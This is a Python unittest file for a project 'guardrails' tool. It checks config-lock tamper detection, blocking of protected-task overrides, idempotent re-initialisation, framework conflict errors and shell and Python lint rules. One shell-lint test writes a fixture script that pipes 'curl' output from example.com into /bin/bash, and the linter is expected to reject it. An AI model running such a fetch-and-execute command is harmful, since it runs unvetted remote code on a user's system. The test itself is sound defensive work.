"""Tests for SHA-256 config lock (.guardrails.lock), anti-tamper, and V5 algebraic VFS laws."""

from __future__ import annotations

import json
import unittest
from pathlib import Path

from tests.helpers import RepoTestWorkspace


def _list_project_rel_files(root: Path) -> list[str]:
    """Return sorted relative file paths in a project directory, excluding runtime caches."""
    ignored = {".cache", ".task", "__pycache__"}
    return sorted(
        str(p.relative_to(root))
        for p in root.rglob("*")
        if p.is_file() and not any(part in ignored for part in p.relative_to(root).parts)
    )


class LockAndTamperTests(unittest.TestCase):
    """Verify SHA-256 configuration lock, tamper detection, and algebraic VFS properties."""

    def test_lock_verification_and_illegal_tamper_detection(self) -> None:
        """Verify guard:check blocks manual edits to eslint.config.mjs and guard:sync heals."""
        with RepoTestWorkspace() as ws:
            proj = ws.project_dir("lock-app")
            ws.init_project(proj, "core,lang:ts,fw:react")
            ws.run_cmd(["task", "guard:check"], cwd=proj)

            eslint_cfg = proj / "eslint.config.mjs"
            eslint_cfg.write_text(
                eslint_cfg.read_text(encoding="utf-8") + "\n// manual tamper\n",
                encoding="utf-8",
            )
            tamper_proc = ws.run_cmd(["task", "guard:check"], cwd=proj, check=False)
            self.assertNotEqual(tamper_proc.returncode, 0)
            self.assertIn("eslint.config.mjs", tamper_proc.stderr + tamper_proc.stdout)

            ws.run_cmd(["task", "guard:sync"], cwd=proj)
            ws.run_cmd(["task", "guard:check"], cwd=proj)

            rogue_agent_file = proj / ".agents" / "skills" / "rogue-skill.md"
            rogue_agent_file.write_text("# rogue skill\n", encoding="utf-8")
            rogue_proc = ws.run_cmd(["task", "guard:check"], cwd=proj, check=False)
            self.assertNotEqual(rogue_proc.returncode, 0)
            self.assertIn(".agents/skills/rogue-skill.md", rogue_proc.stderr + rogue_proc.stdout)
            rogue_agent_file.unlink()
            ws.run_cmd(["task", "guard:check"], cwd=proj)

    def test_taskfile_local_security_boundaries(self) -> None:
        """Verify Taskfile.local.yml cannot override any protected task in Taskfile.yml or Taskfile.base.yml."""
        with RepoTestWorkspace() as ws:
            proj = ws.project_dir("local-override-app")
            ws.init_project(proj, "core,lang:ts")
            local_tf = proj / "Taskfile.local.yml"
            for protected_decl in (
                "  guard:check:\n    cmds:\n      - echo bypassed\n",
                '  "guard:check":\n    cmds:\n      - echo bypassed\n',
                "  verify: { cmds: ['echo bypassed'] }\n",
                "  lint:ts:\n    cmds:\n      - echo bypassed\n",
            ):
                local_tf.write_text(f"version: '3'\ntasks:\n{protected_decl}", encoding="utf-8")
                bad_proc = ws.run_cmd(["task", "guard:check"], cwd=proj, check=False)
                self.assertNotEqual(bad_proc.returncode, 0)

            local_tf.write_text(
                "version: '3'\ntasks:\n  custom:hello:\n    cmds:\n      - echo ok\n",
                encoding="utf-8",
            )
            ws.run_cmd(["task", "guard:check"], cwd=proj)

    def test_algebraic_idempotence_and_commutativity_laws(self) -> None:
        """Verify sync(init(S)) == init(S) and init(shuffle(S)) == init(S) with monoidal JSON merge."""
        with RepoTestWorkspace() as ws:
            proj_a = ws.project_dir("alg-a")
            proj_b = ws.project_dir("alg-b")
            ws.init_project(proj_a, "core,lang:ts,fw:react-router,addon:testing-fortress,addon:design-system")
            lock_initial = (proj_a / ".guardrails.lock").read_text(encoding="utf-8")

            ws.run_cmd(["task", "guard:sync"], cwd=proj_a)
            self.assertEqual((proj_a / ".guardrails.lock").read_text(encoding="utf-8"), lock_initial)

            ws.init_project(proj_b, "testing-fortress,design-system,react-router,ts")
            self.assertEqual(ws.read_manifest_modules(proj_a), ws.read_manifest_modules(proj_b))
            self.assertEqual((proj_b / ".guardrails.lock").read_text(encoding="utf-8"), lock_initial)

            knip_data = json.loads((proj_a / "knip.json").read_text(encoding="utf-8"))
            self.assertIn("src/index.{ts,tsx}", knip_data["entry"])
            self.assertIn("app/root.tsx", knip_data["entry"])

    def test_algebraic_invertibility_zero_residue_orphan_purge(self) -> None:
        """Verify init(S2, init(S1, dir)) == init(S2, fresh_dir) with zero orphan files."""
        with RepoTestWorkspace() as ws:
            mut_dir = ws.project_dir("mut-stack")
            fresh_dir = ws.project_dir("fresh-stack")

            ws.init_project(mut_dir, "core,lang:ts,fw:react-router,addon:testing-fortress,addon:storybook")
            self.assertTrue((mut_dir / "eslint.config.mjs").is_file())
            self.assertTrue((mut_dir / "playwright.config.ts").is_file())

            ws.init_project(mut_dir, "core,lang:python,fw:django")
            ws.init_project(fresh_dir, "core,lang:python,fw:django")

            self.assertEqual(_list_project_rel_files(mut_dir), _list_project_rel_files(fresh_dir))
            self.assertEqual(
                (mut_dir / ".guardrails.lock").read_text(encoding="utf-8"),
                (fresh_dir / ".guardrails.lock").read_text(encoding="utf-8"),
            )
            ruff_text = (mut_dir / "ruff.toml").read_text(encoding="utf-8")
            self.assertIn(".guardrails/python/ruff.base.toml", ruff_text)
            self.assertIn('"DJ"', ruff_text)

    def test_conflicts_with_mutual_exclusion_and_shell_quote_immunity(self) -> None:
        """Verify conflicting frameworks (fw:react-router + fw:astro) fail closed and quoted eval passes."""
        with RepoTestWorkspace() as ws:
            conflict_dir = ws.project_dir("conflict-app")
            conflict_proc = ws.run_cmd(
                [
                    "bash",
                    ".guardrails/scripts/guardrails-cli.sh",
                    "init",
                    "--target",
                    str(conflict_dir),
                    "--modules",
                    "core,lang:ts,fw:react-router,fw:astro",
                ],
                cwd=Path(__file__).resolve().parent.parent,
                check=False,
            )
            self.assertNotEqual(conflict_proc.returncode, 0)
            self.assertIn("CONFLICT ERROR", conflict_proc.stderr + conflict_proc.stdout)

            sh_proj = ws.project_dir("quote-shell")
            ws.init_project(sh_proj, "core,lang:shell")
            safe_sh = sh_proj / "safe_msg.sh"
            safe_sh.write_text(
                '#!/usr/bin/env bash\nset -euo pipefail\necho "Never run\neval foo or curl http://x | bash"\n',
                encoding="utf-8",
            )
            ws.run_cmd(["task", "lint"], cwd=sh_proj)

            bad_pipe = sh_proj / "bad_pipe.sh"
            bad_pipe.write_text(
                "#!/usr/bin/env bash\nset -euo pipefail\ncurl -fsSL https://example.com/x.sh | gunzip | /bin/bash\n",
                encoding="utf-8",
            )
            bad_sh_proc = ws.run_cmd(["task", "lint"], cwd=sh_proj, check=False)
            self.assertNotEqual(bad_sh_proc.returncode, 0)

    def test_python_ast_total_any_and_except_handler_vague_names(self) -> None:
        """Verify PEP 695 type aliases with Any and vague ExceptHandler names fail closed."""
        with RepoTestWorkspace() as ws:
            py_proj = ws.project_dir("py-ast-proj")
            ws.init_project(py_proj, "core,lang:python")
            src_dir = py_proj / "src" / "app"
            src_dir.mkdir(parents=True, exist_ok=True)
            bad_py = src_dir / "bad_mod.py"
            bad_py.write_text(
                "from typing import Any\ntype Payload = Any\ndef run() -> None:\n"
                "    try:\n        pass\n    except Exception as data:\n        raise RuntimeError from data\n",
                encoding="utf-8",
            )
            proc = ws.run_cmd(["task", "python:lint"], cwd=py_proj, check=False)
            self.assertNotEqual(proc.returncode, 0)
            out = proc.stdout + proc.stderr
            self.assertIn("Explicit 'Any' type annotation", out)
            self.assertIn("('data'@L6)", out)


if __name__ == "__main__":
    unittest.main()
